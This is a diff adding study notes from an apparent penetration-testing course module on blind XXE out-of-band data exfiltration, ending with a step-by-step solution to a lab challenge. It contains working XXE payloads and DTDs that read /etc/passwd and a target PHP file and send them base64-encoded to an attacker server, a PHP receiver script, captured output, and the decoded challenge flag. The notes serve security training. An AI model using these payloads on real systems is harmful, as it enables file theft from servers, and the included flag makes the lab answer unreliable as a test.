@@ -1,1 +1,95 @@
 
+In the previous section, we saw an example of a blind XXE vulnerability, where we did not receive any output containing any of our XML input entities. As the web server was displaying PHP runtime errors, we could use this flaw to read the content of files from the displayed errors. In this section, we will see how we can get the content of files in a completely blind situation, where we neither get the output of any of the XML entities nor do we get any PHP errors displayed.
+
+Out-of-band Data Exfiltration
+If we try to repeat any of the methods with the exercise we find at /blind, we will quickly notice that none of them seem to work, as we have no way to have anything printed on the web application response. For such cases, we can utilize a method known as Out-of-band (OOB) Data Exfiltration, which is often used in similar blind cases with many web attacks, like blind SQL injections, blind command injections, blind XSS, and of course, blind XXE. Both the Cross-Site Scripting (XSS) and the Whitebox Pentesting 101: Command Injections modules discussed similar attacks, and here we will utilize a similar attack, with slight modifications to fit our XXE vulnerability.
+
+In our previous attacks, we utilized an out-of-band attack since we hosted the DTD file in our machine and made the web application connect to us (hence out-of-band). So, our attack this time will be pretty similar, with one significant difference. Instead of having the web application output our file entity to a specific XML entity, we will make the web application send a web request to our web server with the content of the file we are reading.
+
+To do so, we can first use a parameter entity for the content of the file we are reading while utilizing PHP filter to base64 encode it. Then, we will create another external parameter entity and reference it to our IP, and place the file parameter value as part of the URL being requested over HTTP, as follows:
+
+EXAMPLE: 
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
+
+If, for example, the file we want to read had the content of XXE_SAMPLE_DATA, then the file parameter would hold its base64 encoded data (WFhFX1NBTVBMRV9EQVRB). When the XML tries to reference the external oob parameter from our machine, it will request http://OUR_IP:8000/?content=WFhFX1NBTVBMRV9EQVRB. Finally, we can decode the WFhFX1NBTVBMRV9EQVRB string to get the content of the file. We can even write a simple PHP script that automatically detects the encoded file content, decodes it, and outputs it to the terminal
+
+
+PHP EXAMPLE:
+<?php
+if(isset($_GET['content'])){
+    error_log("\n\n" . base64_decode($_GET['content']));
+}
+?> 
+
+So, we will first write the above PHP code to index.php, and then start a PHP server on port 8000, as follows:
+
+SYNTAX: 
+MJBUCKNER@htb[/htb]$ nano index.php # here we write the above PHP code
+MJBUCKNER@htb[/htb]$ php -S 0.0.0.0:8000
+
+PHP 7.4.3 Development Server (http://0.0.0.0:8000) started
+
+Now, to initiate our attack, we can use a similar payload to the one we used in the error-based attack, and simply add <root>&content;</root>, which is needed to reference our entity and have it send the request to our machine with the file content:
+
+ERROR ATTACK EXAMPLE: 
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE email [ 
+  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
+  %remote;
+  %oob;
+]>
+<root>&content;</root>
+
+Finally, we can go back to our terminal, and we will see that we did indeed get the request and its decoded content:
+
+EXAMPLE: 
+PHP 7.4.3 Development Server (http://0.0.0.0:8000) started
+10.10.14.16:46256 Accepted
+10.10.14.16:46256 [200]: (null) /xxe.dtd
+10.10.14.16:46256 Closing
+10.10.14.16:46258 Accepted
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+...SNIP...
+
+
+Tip: In addition to storing our base64 encoded data as a parameter to our URL, we may utilize DNS OOB Exfiltration by placing the encoded data as a sub-domain for our URL (e.g. ENCODEDTEXT.our.website.com), and then use a tool like tcpdump to capture any incoming traffic and decode the sub-domain string to get the data. Granted, this method is more advanced and requires more effort to exfiltrate data through.
+
+
+CHALLENGE: 10.129.242.56
+
+Question 1 - Using Blind Data Exfiltration on the '/blind' page to read the content of '/327a6c4304ad5938eaf0efb6cc3e53dc.php' and get the flag.
+1) cat > XXE.dtd << EOF
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/327a6c4304ad5938eaf0efb6cc3e53dc.php">
+<!ENTITY % oob "<!ENTITY content SYSTEM 'http://10.10.15.252:8000/?content=%file;'>">
+EOF
+& open pyhton3 -m http.server 
+
+2) go to http://10.129.242.56
+3) then change the url to http://10.129.242.56/blind/submitDeltails.php
+4) capture GET request in burp 
+5) change to POST request and add the below XXE exploit
+
+
+<?xml version="1.0" encoding="UTF-8"?>
+	<!DOCTYPE email [ 
+	<!ENTITY % remote SYSTEM "http://10.10.15.252:8000/XXE.dtd">
+	  %remote;
+	  %oob;
+	]>
+	<root>
+		&content;
+	</root>
+
+6) hit send and youll see on the python sercver we received the following 
+10.129.242.56 - - [13/Mar/2025 11:42:03] "GET /XXE.dtd HTTP/1.0" 200 -
+10.129.242.56 - - [13/Mar/2025 11:42:03] "GET /?content=PD9waHAgJGZsYWcgPSAiSFRCezFfZDBuN19uMzNkXzB1N3B1N183MF8zeGYxbDdyNDczX2Q0NzR9IjsgPz4K HTTP/1.0" 200 -
+
+PD9waHAgJGZsYWcgPSAiSFRCezFfZDBuN19uMzNkXzB1N3B1N183MF8zeGYxbDdyNDczX2Q0NzR9IjsgPz4K -> we need to decode 
+
+7) echo 'PD9waHAgJGZsYWcgPSAiSFRCezFfZDBuN19uMzNkXzB1N3B1N183MF8zeGYxbDdyNDczX2Q0NzR9IjsgPz4K' | base64 -d
+<?php $flag = "HTB{1_d0n7_n33d_0u7pu7_70_3xf1l7r473_d474}"; ?>
+
